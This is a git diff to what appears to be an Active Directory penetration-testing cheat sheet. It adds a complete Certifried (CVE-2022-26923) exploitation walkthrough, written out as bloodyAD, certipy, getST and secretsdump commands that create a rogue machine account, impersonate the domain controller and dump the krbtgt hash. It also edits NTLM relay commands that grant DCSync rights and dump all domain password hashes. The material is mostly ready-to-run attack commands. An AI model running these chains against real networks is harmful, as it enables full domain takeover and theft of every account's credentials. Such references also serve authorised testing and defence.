@@ -2110,7 +2110,7 @@ python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
 
 - Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD
     ```powershell
-    TERM1> python printerbug.py testsegment.local/testuser@s2012exc.testsegment.local <attacker ip/hostname>
+    TERM1> python printerbug.py testsegment.local/username@s2012exc.testsegment.local <attacker ip/hostname>
     TERM2> ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support
     TERM1> secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc
     ```
@@ -2120,7 +2120,7 @@ python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
     ```powershell
     # create a new machine account
     TERM1> ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support 
-    TERM2> python printerbug.py relaytest.local/testuser@second-dc-server 10.0.2.6
+    TERM2> python printerbug.py relaytest.local/username@second-dc-server 10.0.2.6
     TERM1> getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD' -impersonate DOMAIN_ADMIN_USER_NAME
 
     # connect using the ticket
@@ -2453,6 +2453,46 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
   ```ps1
   certipy relay -ca 172.16.19.100
   ```
+
+#### Certifried CVE-2022-26923
+
+> An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.
+
+* Find ms-DS-MachineAccountQuota
+  ```ps1
+  python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes  'DC=lab,DC=local' ms-DS-MachineAccountQuota 
+  ```
+* Add a new computer in the Active Directory, by default `MachineAccountQuota = 10`
+  ```ps1
+  python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 addComputer cve 'CVEPassword1234*'
+  certipy account create 'lab.local/username:Password123*@dc.lab.local' -user 'cve' -dns 'dc.lab.local'
+  ```
+* [ALTERNATIVE] If you are `SYSTEM` and the `MachineAccountQuota=0`: Use a ticket for the current machine and reset its SPN
+  ```ps1
+  Rubeus.exe tgtdeleg
+  export KRB5CCNAME=/tmp/ws02.ccache
+  python bloodyAD -d lab.local -u 'ws02$' -k --host dc.lab.local setAttribute 'CN=ws02,CN=Computers,DC=lab,DC=local' servicePrincipalName '[]'
+  ```
+* Set the `dNSHostName` attribute to match the Domain Controller hostname
+  ```ps1
+  python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 setAttribute 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName '["DC.lab.local"]'
+  python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName
+  ```
+* Request a ticket
+  ```ps1
+  # certipy req 'domain.local/cve$:CVEPassword1234*@ADCS_IP' -template Machine -dc-ip DC_IP -ca discovered-CA
+  certipy req 'lab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA
+  ```
+* Either use the pfx or set a RBCD on your machine account to takeover the domain
+  ```ps1
+  certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10
+
+  openssl pkcs12 -in dc.pfx -out dc.pem -nodes
+  python bloodyAD.py -d lab.local  -c ":dc.pem" -u 'cve$' --host 10.10.10.10 setRbcd 'CVE$' 'CRASHDC$'
+  getST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 'lab.local/cve$:CVEPassword1234*'   
+  secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 
+  ```
+
 
 ### Dangerous Built-in Groups Usage
 
@@ -3645,3 +3685,5 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Martínez, Kurosh Dabbagh](https://www.blackarrow.net/ad-cs-from-manageca-to-rce/)
 * [Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022](https://www.semperis.com/blog/golden-gmsa-attack/)
 * [Introducing MalSCCM - Phil Keeble -May 4, 2022](https://labs.nettitude.com/blog/introducing-malsccm/)
+* [Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) - Oliver Lyak](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
+* [bloodyAD and CVE-2022-26923 - soka - 11 May 2022](https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html)
